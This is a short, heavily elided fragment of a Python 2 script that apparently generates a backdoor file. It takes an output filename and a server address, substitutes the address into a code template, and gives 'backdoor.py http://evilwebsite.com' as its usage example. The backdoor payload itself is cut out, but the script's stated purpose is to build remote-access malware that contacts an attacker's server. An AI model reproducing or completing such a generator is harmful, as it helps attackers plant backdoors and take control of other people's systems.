...
if len(sys.argv) != 3:
    print '[!] Usage: ' + sys.argv[0] + ' <output filename> <server url/ip>'
    print '[*] Example: ' + sys.argv[0] + ' backdoor.py http://evilwebsite.com'
else:
    ...
    try:
        ...
        code = code.replace ('REPLACE_ME', server)
        ...
        print '[+] ' + os.path.abspath(output_filename) + ' generated successfully!'
    except:
